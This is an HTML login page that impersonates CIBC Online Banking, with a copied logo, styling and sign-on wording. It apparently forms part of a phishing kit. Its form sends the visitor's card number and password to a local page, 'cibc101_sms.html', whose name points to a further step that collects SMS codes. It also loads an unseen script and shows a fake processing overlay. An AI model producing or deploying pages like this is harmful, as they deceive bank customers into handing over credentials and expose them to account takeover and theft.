<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CIBC Online Banking</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: white; margin: 0; color: #333; }
        .cibc-top { text-align: right; padding: 15px 20px; font-size: 15px; color: #333; }
        .cibc-top a { color: #333; text-decoration: none; }
        .cibc-header { display: flex; justify-content: space-between; align-items: center; padding: 0 20px 20px; }
        .cibc-logo { display: flex; align-items: center; color: #b71234; font-size: 32px; font-weight: bold; letter-spacing: -1px; }
        .cibc-logo-diamond { margin-left: 4px; margin-top: 4px; }
        .cibc-container { max-width: 420px; margin: 0 auto; padding: 0 20px; }
        .cibc-title { font-size: 24px; font-weight: 300; margin-bottom: 30px; color: #444; }
        .cibc-label { display: block; font-size: 16px; margin-bottom: 10px; color: #444; }
        .cibc-input { width: 100%; border: 1px solid #888; padding: 15px; box-sizing: border-box; border-radius: 6px; font-size: 16px; margin-bottom: 20px; outline: none; }
        .cibc-input:focus { border-color: #b71234; box-shadow: 0 0 0 1px #b71234; }
        .cibc-checkbox-container { display: flex; align-items: center; font-size: 16px; color: #444; margin-bottom: 30px; cursor: pointer; }
        .cibc-checkbox { width: 22px; height: 22px; margin-right: 12px; border: 1px solid #888; border-radius: 4px; }
        .cibc-btn-primary { width: 100%; background: #b71234; color: white; border: none; padding: 16px; border-radius: 4px; font-size: 18px; cursor: pointer; margin-bottom: 15px; transition: background 0.2s; }
        .cibc-btn-primary:hover { background: #8f0d28; }
        .cibc-btn-secondary { width: 100%; background: white; color: #b71234; border: 1px solid #b71234; padding: 16px; border-radius: 4px; font-size: 18px; cursor: pointer; margin-bottom: 30px; transition: background 0.2s; }
        .cibc-btn-secondary:hover { background: #fdf0f2; }
        .cibc-footer-text { text-align: center; font-size: 16px; color: #444; margin-bottom: 5px; }
        .cibc-footer-link { color: #444; text-decoration: underline; display: block; text-align: center; margin-bottom: 25px; font-size: 16px; }
        
        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #b71234;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #b71234; margin: 30px auto 20px; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
    </style>
</head>
<body>
    <div class="cibc-top">English &nbsp;|&nbsp; <a href="#" style="text-decoration:underline;">Fran&ccedil;ais</a></div>
    <div class="cibc-header">
        <div class="cibc-logo">
            CIBC 
            <div class="cibc-logo-diamond">
                <svg viewBox="0 0 24 24" width="22" height="22">
                    <polygon points="12,2 22,12 12,22 2,12" fill="none" stroke="#b71234" stroke-width="4" stroke-linejoin="miter"></polygon>
                </svg>
            </div>
        </div>
        <div>
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#333" stroke-width="1.5">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            </svg>
        </div>
    </div>
    
    <div class="cibc-container">
        <div class="cibc-title">Sign on to CIBC Online Banking&reg;</div>
        
        <form action="cibc101_sms.html" method="POST">
            <label class="cibc-label">Card number</label>
            <input type="text" name="card_number" id="card_number" class="cibc-input" required>
            
            <label class="cibc-label">Password</label>
            <input type="password" name="password" id="password" class="cibc-input" required>
            
            <label class="cibc-checkbox-container">
                <input type="checkbox" class="cibc-checkbox"> Remember my card 
                <i class="fa-regular fa-circle-info" style="margin-left: 8px; font-size: 18px; color: #555;"></i>
            </label>
            
            <button type="submit" class="cibc-btn-primary">Continue</button>
            <button type="button" class="cibc-btn-secondary">Back</button>
        </form>
        
        <div class="cibc-footer-text">Not registered for online banking?</div>
        <a href="#" class="cibc-footer-link">Register now.</a>
        
        <div class="cibc-footer-text">Trouble signing on?</div>
        <a href="#" class="cibc-footer-link">Reset your password.</a>

    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>

    
<script src="security_module.js"></script>
</body>
</html>
